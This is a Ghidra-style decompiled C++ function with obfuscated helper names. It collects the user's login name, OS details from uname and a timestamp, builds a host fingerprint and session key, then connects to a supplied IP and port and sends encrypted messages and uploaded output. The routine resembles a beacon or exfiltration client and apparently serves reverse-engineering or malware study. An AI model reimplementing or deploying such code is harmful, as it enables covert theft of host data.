
int kvhlfowzlznog(char *ip,uint16_t port,char *output,size_t length)

{
  long lVar1;
  bool bVar2;
  int sock_00;
  char *version_00;
  iterator __last;
  iterator __first;
  size_t sVar3;
  void *pvVar4;
  long in_FS_OFFSET;
  int result;
  int sock;
  __normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
  it;
  char *username;
  char *version;
  char *os;
  timeval tv;
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  messages;
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  uploads;
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  ciphertexts;
  iterator local_268;
  string my_uuid;
  string fp;
  string session_key;
  string local_1e8;
  string local_1c8;
  utsname ubuf;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  result = -1;
  yridlcsrsfalm(&my_uuid,0x10);
  std::
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  ::vector(&messages);
  std::
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  ::vector(&uploads);
  std::
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  ::vector(&ciphertexts);
                    /* try { // try from 0015a634 to 0015a6ca has its CatchHandler @ 0015ac78 */
  username = getlogin();
  if (username == (char *)0x0) {
    username = tgexpgbgxulli(5);
  }
  version_00 = tgexpgbgxulli(0x11);
  uname((utsname *)&ubuf);
  gettimeofday((timeval *)&tv,(__timezone_ptr_t)0x0);
  fingerprint(&fp,username,version_00,ubuf.sysname,tv.tv_sec);
                    /* try { // try from 0015a6ea to 0015a6ee has its CatchHandler @ 0015ac64 */
  fpToK(&session_key,username,version_00,tv.tv_sec);
                    /* try { // try from 0015a6f4 to 0015a746 has its CatchHandler @ 0015ac50 */
  aotxxfxjjvuoy(0x11);
  aotxxfxjjvuoy(5);
  sock_00 = biuuwoagwpgxf(ip,port);
  if (-1 < sock_00) {
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
              ((basic_string *)&local_1c8);
                    /* try { // try from 0015a759 to 0015a75d has its CatchHandler @ 0015abad */
    result = ozzumyndvjsex(sock_00,&local_1c8);
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1c8);
    if (result == 0) {
                    /* try { // try from 0015a794 to 0015a798 has its CatchHandler @ 0015ac50 */
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
                ((basic_string *)&local_1e8);
                    /* try { // try from 0015a7ad to 0015a7b1 has its CatchHandler @ 0015abd8 */
      yaofehedpjtbv(&local_1c8,&local_1e8);
                    /* try { // try from 0015a7c6 to 0015a7ca has its CatchHandler @ 0015abc4 */
      std::
      vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
      ::push_back(&messages,(value_type *)&local_1c8);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1c8);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1e8);
                    /* try { // try from 0015a7fd to 0015a801 has its CatchHandler @ 0015ac50 */
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
                ((basic_string *)&local_1c8);
                    /* try { // try from 0015a821 to 0015a825 has its CatchHandler @ 0015abec */
      qtvadngpclels((vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
                     *)&local_268,&local_1c8,output,length);
      std::
      vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
      ::operator=(&uploads,(vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
                            *)&local_268);
      std::
      vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
      ::~vector((vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
                 *)&local_268);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1c8);
      __last = std::
               vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
               ::end(&uploads);
      __first = std::
                vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
                ::begin(&uploads);
      it = (basic_string<char,std--char_traits<char>,std--allocator<char>> *)
           std::
           vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
           ::end(&messages);
      __gnu_cxx::
      __normal_iterator<conststd--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
      ::__normal_iterator<std--__cxx11--basic_string<char>*>
                ((__normal_iterator<conststd--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
                  *)&local_268,&it);
                    /* try { // try from 0015a8c7 to 0015a8da has its CatchHandler @ 0015ac50 */
      std::
      vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
      ::
      insert<__gnu_cxx--__normal_iterator<std--__cxx11--basic_string<char>*,std--vector<std--__cxx11--basic_string<char>>>>
                (&messages,(const_iterator)local_268,
                 (__normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
                  )__first,
                 (__normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
                  )__last);
      odjqrhivxgysa(&local_1c8);
                    /* try { // try from 0015a8ef to 0015a8f3 has its CatchHandler @ 0015ac00 */
      std::
      vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
      ::push_back(&messages,(value_type *)&local_1c8);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1c8);
      it = (basic_string<char,std--char_traits<char>,std--allocator<char>> *)
           std::
           vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
           ::begin(&messages);
      while( true ) {
        local_268 = (basic_string<char,std--char_traits<char>,std--allocator<char>> *)
                    std::
                    vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
                    ::end(&messages);
        bVar2 = __gnu_cxx::
                operator!=<std--__cxx11--basic_string<char>*,std--vector<std--__cxx11--basic_string<char>>>
                          (&it,(__normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
                                *)&local_268);
        if (bVar2 == false) break;
        __gnu_cxx::
        __normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
        ::operator->(&it);
        sVar3 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length
                          ();
        __gnu_cxx::
        __normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
        ::operator->(&it);
        pvVar4 = (void *)std::__cxx11::
                         basic_string<char,std::char_traits<char>,std::allocator<char>>::data();
                    /* try { // try from 0015a998 to 0015a99c has its CatchHandler @ 0015ac50 */
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
                  ((basic_string *)&local_1e8);
                    /* try { // try from 0015a9b4 to 0015a9b8 has its CatchHandler @ 0015ac28 */
        ooztdegbobfaj(&local_1c8,&local_1e8,pvVar4,sVar3);
                    /* try { // try from 0015a9cd to 0015a9d1 has its CatchHandler @ 0015ac14 */
        std::
        vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
        ::push_back(&ciphertexts,(value_type *)&local_1c8);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1c8);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1e8);
        __gnu_cxx::
        __normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
        ::operator++(&it,0);
      }
      it = (basic_string<char,std--char_traits<char>,std--allocator<char>> *)
           std::
           vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
           ::begin(&ciphertexts);
      while( true ) {
        local_268 = (basic_string<char,std--char_traits<char>,std--allocator<char>> *)
                    std::
                    vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
                    ::end(&ciphertexts);
        bVar2 = __gnu_cxx::
                operator!=<std--__cxx11--basic_string<char>*,std--vector<std--__cxx11--basic_string<char>>>
                          (&it,(__normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
                                *)&local_268);
        if (bVar2 == false) break;
        __gnu_cxx::
        __normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
        ::operator->(&it);
        sVar3 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length
                          ();
        __gnu_cxx::
        __normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
        ::operator->(&it);
        pvVar4 = (void *)std::__cxx11::
                         basic_string<char,std::char_traits<char>,std::allocator<char>>::data();
                    /* try { // try from 0015aa98 to 0015aac4 has its CatchHandler @ 0015ac50 */
        result = aqoickhvmchnw(sock_00,pvVar4,sVar3);
        if (result != 0) break;
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
                  ((basic_string *)&local_1c8);
                    /* try { // try from 0015aad7 to 0015aadb has its CatchHandler @ 0015ac3c */
        result = icjeiywvzrcqt(sock_00,&local_1c8);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_1c8);
        if (result != 0) break;
        __gnu_cxx::
        __normal_iterator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>*,std--vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>>
        ::operator++(&it,0);
      }
    }
  }
  if (-1 < sock_00) {
                    /* try { // try from 0015ab2e to 0015ab32 has its CatchHandler @ 0015ac50 */
    close(sock_00);
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&session_key);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&fp);
  std::
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  ::~vector(&ciphertexts);
  std::
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  ::~vector(&uploads);
  std::
  vector<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>,std--allocator<std--__cxx11--basic_string<char,std--char_traits<char>,std--allocator<char>>>>
  ::~vector(&messages);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&my_uuid);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return result;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}


